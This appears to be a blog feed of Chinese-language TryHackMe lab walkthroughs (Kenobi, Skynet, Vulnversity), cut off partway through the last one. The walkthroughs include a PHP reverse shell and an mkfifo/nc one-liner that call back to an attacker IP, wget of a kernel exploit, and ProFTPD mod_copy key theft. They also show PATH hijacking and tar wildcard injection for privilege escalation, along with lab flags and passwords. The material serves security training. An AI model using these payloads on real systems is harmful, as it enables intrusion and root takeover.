    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Kenobi"><a href="#Offensive-Pentesting-Kenobi" class="headerlink" title="Offensive Pentesting-Kenobi"></a>Offensive Pentesting-Kenobi</h1><pre><code>Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.此房间将涵盖访问 Samba 共享、操纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。</code></pre><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><pre><code>┌──(root㉿kali)-[/home/w3nx1z1]└─# nmap -T4 -sV -sC 10.10.233.125Starting Nmap 7.92 ( https://nmap.org ) at 2024-11-17 11:09 CSTNmap scan report for 10.10.233.125Host is up (0.27s latency).Not shown: 993 closed tcp ports (reset)PORT     STATE SERVICE     VERSION21/tcp   open  ftp         ProFTPD 1.3.522/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/admin.html|_http-title: Site doesn&#39;t have a title (text/html).111/tcp  open  rpcbind     2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  2,3,4       2049/tcp   nfs|   100003  2,3,4       2049/tcp6  nfs|   100003  2,3,4       2049/udp   nfs|   100003  2,3,4       2049/udp6  nfs|   100005  1,2,3      36585/udp   mountd|   100005  1,2,3      49263/tcp   mountd|   100005  1,2,3      54329/udp6  mountd|   100005  1,2,3      59841/tcp6  mountd|   100021  1,3,4      39645/tcp   nlockmgr|   100021  1,3,4      40321/udp6  nlockmgr|   100021  1,3,4      44189/tcp6  nlockmgr|   100021  1,3,4      58684/udp   nlockmgr|   100227  2,3         2049/tcp   nfs_acl|   100227  2,3         2049/tcp6  nfs_acl|   100227  2,3         2049/udp   nfs_acl|_  100227  2,3         2049/udp6  nfs_acl139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp open  nfs_acl     2-3 (RPC #100227)Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)|_clock-skew: mean: 1h59m59s, deviation: 3h27m51s, median: -1s|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode: |   3.1.1: |_    Message signing enabled but not required| smb2-time: |   date: 2024-11-17T03:10:03|_  start_date: N/A| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: kenobi|   NetBIOS computer name: KENOBI\x00|   Domain name: \x00|   FQDN: kenobi|_  System time: 2024-11-16T21:10:03-06:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.90 seconds</code></pre><p>Scan the machine with nmap, how many ports are open?</p><pre><code>7</code></pre><h2 id="Enumerating-Samba-for-shares-枚举Samba"><a href="#Enumerating-Samba-for-shares-枚举Samba" class="headerlink" title="Enumerating Samba for shares(枚举Samba)"></a>Enumerating Samba for shares(枚举Samba)</h2><pre><code>Samba 是适用于 Linux 和 Unix 的标准 Windows 互操作性程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常见共享资源。它通常被称为网络文件系统。Samba 基于服务器消息块 （SMB） 的通用客户端/服务器协议。SMB 专为 Windows 开发，如果没有 Samba，其他计算机平台将与 Windows 计算机隔离，即使它们属于同一网络。</code></pre><p>使用 nmap，我们可以枚举 SMB 共享的计算机。</p><p>Nmap 能够运行以自动执行各种网络任务。有一个脚本可以列举份额！</p><pre><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.233.125</code></pre><p>SMB 有两个端口，即 445 和 139。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171126600.png" alt="https://i.imgur.com/bkgVNy3.png"></p><p>使用上面的 nmap 命令，找到了多少个共享？</p><pre><code>3</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171127818.png" alt="image-20241117112738713"></p><p>我们可以使用这条命令来连接到计算机的网络共享 并查看其中的文件</p><pre><code>smbclient //10.10.233.125/anonymous</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171130073.png" alt="image-20241117113021004"></p><p>连接后，列出共享中的文件。您可以看到什么文件？</p><pre><code>log.txt</code></pre><p>可以使用more命令来读取其中的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171155750.png" alt="image-20241117115555645"></p><p>到这里其实已经可以回答下面的问题了</p><p>What port is FTP running on?</p><pre><code>21</code></pre><p>在接着往下看</p><p>您也可以以递归方式下载 SMB 共享。将用户名和密码作为 nothing 提交。</p><pre><code>smbget -R smb://10.10.40.36/anonymous</code></pre><p>打开共享上的文件。发现了一些有趣的事情。</p><ul><li>可以发现为kenobi用户生成了ssh私钥的信息</li><li>有关 ProFTPD 服务器的信息。</li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171711745.png" alt="image-20241117171131658"></p><p>这个操作和网络速度有关系 有时候会报错连接不上 多试几次就好了</p><p>这部分是为用户生成 SSH 密钥时为 Kenobi 生成的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171721192.png" alt="image-20241117172142137"></p><p>这一部分是有关 ProFTPD 服务器的信息 也提到了FTP服务在21端口上运行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171723192.png" alt="image-20241117172355122"></p><p>您之前的 nmap 端口扫描将显示端口 111 运行服务 rpcbind。这只是一个将远程过程调用 （RPC） 程序编号转换为通用地址的服务器。当 RPC 服务启动时，它会告诉 rpcbind 它正在侦听的地址以及它准备提供的 RPC 程序编号。</p><p>在我们的例子中，端口 111 是对网络文件系统的访问。让我们用 nmap 来列举一下。</p><pre><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.40.36</code></pre><p>这里可以看到开放的111端口运行了rpcbind服务(远程过程调用) 在这里是远程文件系统的共享 通过nfs-showmount的内容得知 当前目标主机通过nfs服务共享了&#x2F;var文件夹 同时<code>*</code>表示此共享目录对所有客户端（任何主机）都开放访问权限</p><p><img src="C:/Users/hp/AppData/Roaming/Typora/typora-user-images/image-20241117172649592.png" alt="image-20241117172649592"></p><p>What mount can we see?</p><pre><code>/var</code></pre><h2 id="Gain-initial-access-with-ProFtpd-通过ProFtpd-获得初始访问权限"><a href="#Gain-initial-access-with-ProFtpd-通过ProFtpd-获得初始访问权限" class="headerlink" title="Gain initial access with ProFtpd(通过ProFtpd 获得初始访问权限)"></a>Gain initial access with ProFtpd(通过ProFtpd 获得初始访问权限)</h2><pre><code>ProFtpd 是一个免费的开源 FTP 服务器，与 Unix 和 Windows 系统兼容。它在过去的软件版本中也容易受到攻击。</code></pre><p>让我们获取 ProFtpd 的版本。使用 netcat 通过 FTP 端口连接到本机。</p><p>版本是什么？</p><pre><code>1.3.5</code></pre><p>这一点我们在前面nmap扫端口的时候就已经可以分析出来</p><pre><code>PORT     STATE SERVICE     VERSION21/tcp   open  ftp         ProFTPD 1.3.5</code></pre><p>我们可以使用 searchsploit 来查找特定软件版本的漏洞。</p><p>Searchsploit 基本上只是一个用于 exploit-db.com 的命令行搜索工具。</p><p>ProFTPd 运行有多少个漏洞？</p><pre><code>4</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171736471.png" alt="image-20241117173632314"></p><p>但是这里我们不直接使用搜到的ProFTPd 1.3.5的漏洞利用文件 而是按照我们上面在日志中找到的记录  利用为kenobi用户生成的ssh私钥  来ssh远程连接 登录到kenobi账户</p><p>ProFtpd的mod_copy 模块可以实现 <strong>SITE CPFR</strong> 和 <strong>SITE CPTO</strong> 命令，这些命令可用于将文件&#x2F;目录从服务器上的一个位置复制到另一个位置。任何未经身份验证的客户端都可以利用这些命令将文件从文件系统的任何部分复制到选定的目标。</p><p>我们知道 FTP 服务以 Kenobi 用户身份运行（从共享上的文件），并且会为该用户生成 ssh 密钥。</p><p>根据上面找到的开启FTP服务的端口是21 我们可以先来连接这个FTP服务 在日志中找到私钥在目标靶机上保存的路径是&#x2F;home&#x2F;kenobi&#x2F;.ssh&#x2F;id_rsa</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172122889.png" alt="image-20241117212242832"></p><pre><code>┌──(w3nx1z1㉿kali)-[~/桌面]└─$ nc 10.10.166.18 21220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.166.18]SITE CPFR /home/kenobi/.ssh/id_rsa # 需要我们输入350 File or directory exists, ready for destination nameSITE CPTO /var/tmp/id_rsa    # 需要我们输入250 Copy successful</code></pre><p>这样我们就将&#x2F;home&#x2F;kenobi&#x2F;.ssh&#x2F;id_rsa私钥复制到了&#x2F;var&#x2F;tmp&#x2F;id_rsa 同时根据上面任务2的第四题 我们得知rpcbind服务开启的共享文件夹服务就是挂载在了&#x2F;var文件夹上</p><pre><code>mkdir /mnt/kenobiNFSmount 10.10.166.18:/var /mnt/kenobiNFSls /mnt/kenobiNFS/tmp</code></pre><p>此时我们看到&#x2F;mnt&#x2F;kenobiNFS&#x2F;tmp文件夹下已经有了我们需要的私钥文件 下面将这个私钥文件复制到当前文件夹中</p><pre><code>cp /mnt/kenobiNFS/tmp/id_rsa .</code></pre><p>在赋予私钥文件600权限 </p><pre><code>sudo chmod 600 id_rsa</code></pre><table><thead><tr><th>权限编号</th><th>权限字符串</th><th>拥有者权限</th><th>组权限</th><th>其他人权限</th><th>常见用途</th></tr></thead><tbody><tr><td><strong>600</strong></td><td><code>rw-------</code></td><td>读写</td><td>无</td><td>无</td><td>SSH 私钥文件</td></tr><tr><td><strong>644</strong></td><td><code>rw-r--r--</code></td><td>读写</td><td>读</td><td>读</td><td>公共文件</td></tr><tr><td><strong>755</strong></td><td><code>rwxr-xr-x</code></td><td>读写执行</td><td>读执行</td><td>读执行</td><td>可执行脚本或程序</td></tr><tr><td><strong>777</strong></td><td><code>rwxrwxrwx</code></td><td>读写执行</td><td>读写执行</td><td>读写执行</td><td>开放权限，通常不推荐</td></tr></tbody></table><p>上面是一些常见的权限对应的用途 这里只能给600权限 太高权限会报错 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172132256.png" alt="image-20241117213225173"></p><p>这里给到600权限后 我们连上shell 拿到用户文件夹下的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172133509.png" alt="image-20241117213330434"></p><p>What is Kenobi’s user flag (&#x2F;home&#x2F;kenobi&#x2F;user.txt)?</p><pre><code>d0b0f3f53b6caa532a83915e19224899</code></pre><h2 id="Privilege-Escalation-with-Path-Variable-Manipulation-suid提权之menu提权"><a href="#Privilege-Escalation-with-Path-Variable-Manipulation-suid提权之menu提权" class="headerlink" title="Privilege Escalation with Path Variable Manipulation(suid提权之menu提权)"></a>Privilege Escalation with Path Variable Manipulation(suid提权之menu提权)</h2><p>同样在拿到kenobi普通用户的shell之后 我们需要进行提权 进而拿到root用户的权限 也是先看一下有无可以利用的suid命令</p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p>这里看到 虽然同样是给了sudo和su 但是我们并不知道kenobi用户的登陆密码 因此这里我们选择使用meun来提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172136397.png" alt="image-20241117213630328"></p><p>我们尝试运行一下这个命令 发现在执行的时候会出现三个选项 选择不同选项之后会执行对应的命令并输出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172138243.png" alt="image-20241117213824161"></p><p>这里使用strings命令 可以在这个可执行的二进制程序中查找我们可读的字符串 看到了三个选项对应的三个会执行的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172143205.png" alt="image-20241117214325146"></p><p>那我们这里使用命令劫持 伪造一个curl </p><pre><code>kenobi@kenobi:~$ cd /tmpkenobi@kenobi:/tmp$ echo /bin/sh &gt; curlkenobi@kenobi:/tmp$ chmod 777 curlkenobi@kenobi:/tmp$ export PATH=/tmp:$PATH</code></pre><p>意思就是在&#x2F;tmp中创建一个curl文件 将<code>/bin/sh</code>写入这个curl文件中并给予他777的权限 同时在环境变量中将将 <code>/tmp</code> 目录添加到最前面 并在 <code>/tmp</code> 之后，保留原有的路径列表 这样的话在我们执行命令的时候 会先从&#x2F;tmp文件夹中寻找并执行 这样就可以优先执行我们伪造的“curl”文件 进而执行<code>/bin/sh</code>命令 又因为我们在执行menu时 选择选项1 执行的是</p><pre><code>curl -I localhost</code></pre><p>这样在命令劫持之后就变成了</p><pre><code>/bin/sh -I localhost</code></pre><p>但是因为menu命令有suid权限 那此时执行的<code>/bin/sh</code>也就有了root权限 从而给我们返回一个root权限的shell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172155130.png" alt="image-20241117215509068"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.Samba 共享文件夹读取、下载远程靶机中的文件</p><p>2.proftpd 1.3.5的mod_copy 模块漏洞允许任意客户端将文件从文件系统的任何部分复制到选定的位置</p><p>3.将共享的远程文件夹挂载到本地文件夹中 复制出上一步移动的私钥文件 ssh连接普通用户</p><p>4.SUID提权 利用命令劫持 执行<code>/bin/sh</code>命令 拿到root权限的shell</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-Kenobi&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-Kenobi&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-Kenobi&quot;&gt;&lt;/a&gt;Offen</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-Skynet</title>
    <link href="http://w3nx1z1.github.io/posts/c70d91b2.html"/>
    <id>http://w3nx1z1.github.io/posts/c70d91b2.html</id>
    <published>2024-11-26T09:04:38.428Z</published>
    <updated>2025-02-14T08:30:17.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Skynet"><a href="#Offensive-Pentesting-Skynet" class="headerlink" title="Offensive Pentesting-Skynet"></a>Offensive Pentesting-Skynet</h1><h2 id="扫端口-分析共享文件夹服务"><a href="#扫端口-分析共享文件夹服务" class="headerlink" title="扫端口 分析共享文件夹服务"></a>扫端口 分析共享文件夹服务</h2><p>拿到之后先扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182033539.png" alt="image-20241118203335458"></p><p>同样发现了139和445端口 猜测存在共享目录 处理手法类似Kenobi</p><pre><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.220.154 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182123462.png" alt="image-20241118212335390"></p><p>根据这一部分</p><pre><code>|   SKYNET\milesdyson (RID: 1000)|     Full name:   |     Description: |_    Flags:       Normal user account</code></pre><p>可以判断出用户是milesdyson</p><p>同样发现了anonymous路径 共享的是<code>C:\srv\samba</code>目录 连接上看看有什么文件</p><pre><code>smbclient //10.10.53.137/anonymous</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182131231.png" alt="image-20241118213143153"></p><pre><code>smbget -R smb://10.10.53.137/anonymous</code></pre><p>两个有效文件 一个让修改密码 一个看起来是密码字典文件 应该是需要我们结合账户名milesdyson 来进行一个密码的爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182133535.png" alt="image-20241118213331468"></p><h2 id="扫目录-发现邮件登陆页面"><a href="#扫目录-发现邮件登陆页面" class="headerlink" title="扫目录 发现邮件登陆页面"></a>扫目录 发现邮件登陆页面</h2><p>我们先访问一下网页</p><p>下面使用gobuster来扫目录</p><pre><code>gobuster dir -u http://10.10.220.154/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182137214.png" alt="image-20241118213759133"></p><p>发现一个关键的目录：&#x2F;squirrelmail 进行访问 发现是一个邮件管理系统的后台登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182138044.png" alt="image-20241118213846975"></p><p>使用burpsuite进行抓包爆破 得到密码cyborg007haloterminator</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182148376.png" alt="image-20241118214811299"></p><p>What is Miles password for his emails?</p><pre><code>cyborg007haloterminator</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182150075.png" alt="image-20241118215055992"></p><p>登陆之后 可以看到第一封是一个密码重置的邮件</p><pre><code>)s&#123;A&amp;2Z=F^n_E.B` </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182248278.png" alt="image-20241118224847168"></p><h2 id="使用smbclient连接smb共享"><a href="#使用smbclient连接smb共享" class="headerlink" title="使用smbclient连接smb共享"></a>使用smbclient连接smb共享</h2><pre><code>smbclient -U milesdyson //10.10.49.13/milesdyson </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182330217.png" alt="image-20241118233005964"></p><p>在其中找到一个important.txt 导出</p><pre><code>1. Add features to beta CMS /45kra24zxs28v3yd2. Work on T-800 Model 101 blueprints3. Spend more time with my wife</code></pre><p>找到隐藏的CMS路径 <code>/45kra24zxs28v3yd</code> 访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182338109.png" alt="image-20241118233813780"></p><p>What is the hidden directory?</p><pre><code>/45kra24zxs28v3yd</code></pre><h2 id="Cuppa-CMS存在远程文件包含漏洞"><a href="#Cuppa-CMS存在远程文件包含漏洞" class="headerlink" title="Cuppa CMS存在远程文件包含漏洞"></a>Cuppa CMS存在远程文件包含漏洞</h2><p>找到这个隐藏目录之后 我们先扫一下 看看有没有进一步可以利用的目录或者文件</p><pre><code>python3 dirsearch.py -u http://10.10.49.13/45kra24zxs28v3yd/ -i 200</code></pre><p>找到一个<code>administrator/ </code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191534967.png" alt="image-20241119153421896"></p><p>访问一下 发现是Cuppa CMS</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191535564.png" alt="image-20241119153518460"></p><p>搜一下这个CMS的漏洞 发现有远程文件包含 也就是<code>Remote File Inclusion</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191535897.png" alt="image-20241119153543837"></p><p>What is the vulnerability called when you can include a remote file for malicious purposes?</p><pre><code>remote file inclusion </code></pre><h3 id="利用文件包含读取当前用户的flag"><a href="#利用文件包含读取当前用户的flag" class="headerlink" title="利用文件包含读取当前用户的flag"></a>利用文件包含读取当前用户的flag</h3><p>我们先来看一下这个漏洞利用文件</p><pre><code>searchsploit -p 25971.txtcp /usr/share/exploitdb/exploits/php/webapps/25971.txt 25971.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191538074.png" alt="image-20241119153829015"></p><p>主要是这部分 在<code>alerts/alertConfigField.php</code>路径传入<code>urlConfig</code>参数就可以实现远程文件包含</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191539359.png" alt="image-20241119153906280"></p><p>burpsuite抓包 尝试读取用户文件夹下的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191540009.png" alt="image-20241119154037894"></p><p>What is the user flag?</p><pre><code>7ce5c2109a40f958099283600a9ae807</code></pre><h2 id="远程文件包含反弹shell并提权"><a href="#远程文件包含反弹shell并提权" class="headerlink" title="远程文件包含反弹shell并提权"></a>远程文件包含反弹shell并提权</h2><p><a href="https://www.cnblogs.com/shacker/p/15943923.html">渗透测试之远程文件包含 - shacker_shen - 博客园</a></p><p>操作可以参考上面这篇文章 下面来进行我们的操作 </p><p>先创建一个<code>reverse_shell.txt</code></p><pre><code class="php">&lt;?php$ip=&quot;10.14.92.176&quot;;$port=2333;$sock = fsockopen($ip, $port);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);?&gt;</code></pre><p>开启Apache服务 将这个反弹shell的文件复制到我们本地的网站根目录下</p><pre><code>systemctl start apache2.servicecp reverse_shell.txt /var/www/html/reverse_shell.txt</code></pre><p>在靶机网站中访问</p><pre><code>http://10.10.24.215/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.92.176/reverse_shell.txt?</code></pre><p>本机监听2333端口 成功反弹shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191601218.png" alt="image-20241119160123155"></p><p>这里提权有两种方法</p><h3 id="内核版本漏洞提权"><a href="#内核版本漏洞提权" class="headerlink" title="内核版本漏洞提权"></a>内核版本漏洞提权</h3><p>看一下内核版本 </p><pre><code>uname -a</code></pre><p>发现是4.8.0 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411192113756.png" alt="image-20241119211318664"></p><p>searchsploit找一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411192115148.png" alt="image-20241119211515069"></p><p>使用43418.c </p><pre><code>searchsploit -p 43418.c cp /usr/share/exploitdb/exploits/linux/local/43418.c .cp 43418.c /var/www/html/43418.c</code></pre><p>在靶机上下载这个.c文件</p><pre><code>wget 10.14.92.176/43418.cgcc 43418.c -o pwn1chmod +x pwn1./pwn1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411192119096.png" alt="image-20241119211959014"></p><p>What is the root flag?</p><pre><code>3f0372db24753accc7179a282cd6a949</code></pre><h3 id="tar通配符提权"><a href="#tar通配符提权" class="headerlink" title="tar通配符提权"></a>tar通配符提权</h3><p>在用户文件夹下发现一个backups文件夹 里面有个backup.sh 内容是使用tar将网站根目录中的所有文件和文件夹进行打包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411221046929.png" alt="image-20241122104657848"></p><p>看一下定时任务</p><pre><code>cat /etc/crontab</code></pre><p>看起来是每隔一分钟执行一次 而且权限还是root</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411221048097.png" alt="image-20241122104851022"></p><p>两种做法 一种是反弹shell 一种直接创建一个二进制文件执行获得root权限</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.114.143 2333 &gt;/tmp/f&quot; &gt; shell.shtouch &quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;touch &quot;/var/www/html/--checkpoint=1&quot;</code></pre><p>在监听一下</p><pre><code>nc -lvvp 2333</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-Skynet&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-Skynet&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-Skynet&quot;&gt;&lt;/a&gt;Offen</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-Vulnversity</title>
    <link href="http://w3nx1z1.github.io/posts/ca758c20.html"/>
    <id>http://w3nx1z1.github.io/posts/ca758c20.html</id>
    <published>2024-11-26T09:04:30.499Z</published>
    <updated>2025-02-14T08:30:17.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Vulnversity"><a href="#Offensive-Pentesting-Vulnversity" class="headerlink" title="Offensive Pentesting-Vulnversity"></a>Offensive Pentesting-Vulnversity</h1><h2 id="nmap使用"><a href="#nmap使用" class="headerlink" title="nmap使用"></a>nmap使用</h2><table><thead><tr><th>Nmap flag</th><th>Description</th></tr></thead><tbody><tr><td>-sV</td><td>Attempts to determine the version of the services running</td></tr><tr><td>-p <x> or -p-</td><td>Port scan for port <x> or scan all ports</td></tr><tr><td>-Pn</td><td>Disable host discovery and scan for open ports</td></tr><tr><td>-A</td><td>Enables OS and version detection, executes in-build scripts for further enumeration</td></tr><tr><td>-sC</td><td>Scan with the default Nmap scripts</td></tr><tr><td>-v</td><td>Verbose mode</td></tr><tr><td>-sU</td><td>UDP port scan</td></tr><tr><td>-sS</td><td>TCP SYN port scan</td></tr></tbody></table><p>这里我们主要使用两个命令</p><pre><code>nmap -T4 -sC -sV 10.10.229.26 或 nmap -A -p- -v 10.10.229.26</code></pre><p>后面这个会比较慢 但是更为全面</p><pre><code>1. nmap -T4 -sC -sV 10.10.229.26-T4: 这个选项控制 nmap 的扫描速度和时间。T4 是一个优化选项，表示在扫描过程中提高扫描速度。-sC: 这个选项启用 默认脚本扫描，也就是使用 nmap 提供的默认脚本（Nmap Scripting Engine，NSE）。-sV: 这个选项启用 版本扫描，会探测目标主机上开放端口的服务版本信息。总结: nmap -T4 -sC -sV 10.10.229.26 是一个 快速扫描，进行 版本检测 和 默认脚本扫描，重点是发现开放端口和服务版本，同时利用默认脚本探测潜在的安全问题或配置问题。2. nmap -A -p- -v 10.10.229.26-A: 这个选项启用 主动扫描，包括多种扫描功能，包含了以下几项：操作系统检测 (OS detection): 尝试识别目标主机的操作系统类型和版本。版本扫描 (Version scanning): 类似于 -sV，识别目标主机的服务和版本。脚本扫描 (Nmap Scripting Engine): 执行多种与安全相关的脚本，类似于 -sC。Traceroute: 执行路由追踪，显示目标主机的路由路径。-p-: 这个选项指定 nmap 扫描 所有端口，即从 1 到 65535 的所有端口。默认情况下，nmap 只扫描常见的 1000 个端口，使用 -p- 可以确保扫描所有端口。-v: 这个选项启用 详细输出，会提供更多的扫描信息，包括扫描进度、发现的服务、操作系统信息等。总结: nmap -A -p- -v 10.10.229.26 是一个 全面扫描，执行操作系统检测、服务版本检测、脚本扫描、路由追踪，并且扫描所有端口。它提供了更多的信息和细节，适合用来进行全面的目标分析，尤其是在信息收集阶段。主要区别：扫描范围：nmap -T4 -sC -sV：只扫描常见的 1000 个端口，快速进行版本和脚本扫描。nmap -A -p- -v：扫描所有 65535 个端口，进行操作系统检测、版本检测、脚本扫描等更全面的扫描。扫描内容：nmap -T4 -sC -sV：使用默认脚本集、版本检测和较快的扫描速度。nmap -A -p- -v：进行更加全面的扫描，涵盖操作系统识别、服务版本、NSE 脚本、Traceroute 等。速度与信息：nmap -T4 -sC -sV 适用于 较快的扫描，并获取基本的版本和常见的安全漏洞信息。nmap -A -p- -v 适用于 全面的扫描，可以得到更加详细的信息，但也会需要更长的时间。总结：nmap -T4 -sC -sV 10.10.229.26 是一个快速且较为轻量的扫描，主要用于获取目标的版本信息和默认脚本扫描的结果。nmap -A -p- -v 10.10.229.26 是一个全面且深入的扫描，扫描所有端口并进行操作系统识别、服务版本检测、脚本扫描和路由追踪等。</code></pre><p>看一下扫描结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411152322027.png" alt="image-20241115232216910"></p><p>Scan the box; how many ports are open?</p><pre><code class="6">6</code></pre><p>What version of the squid proxy is running on the machine?</p><pre><code>3.5.12</code></pre><p>How many ports will Nmap scan if the flag <strong>-p-400</strong> was used?</p><pre><code>400</code></pre><p>What is the most likely operating system this machine is running?</p><pre><code>ubuntu</code></pre><p>What port is the web server running on?</p><pre><code>3333</code></pre><p>What is the flag for enabling verbose mode using Nmap?</p><pre><code>-v</code></pre><h2 id="gobuster使用"><a href="#gobuster使用" class="headerlink" title="gobuster使用"></a>gobuster使用</h2><table><thead><tr><th><strong>Gobuster 标志</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>-e</td><td>在控制台中打印完整的 URL</td></tr><tr><td>-u</td><td>目标 URL</td></tr><tr><td>-w</td><td>单词列表的路径</td></tr><tr><td>-U 和 -P</td><td>基本身份验证的用户名和密码</td></tr><tr><td>-p <strong><x></strong></td><td>用于请求的代理</td></tr><tr><td>-c <http Cookie></td><td>指定用于模拟身份验证的 Cookie</td></tr></tbody></table><p>在使用的时候需要指定字典的路径</p><pre><code>gobuster dir -u http://10.10.7.199:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code></pre><p><img 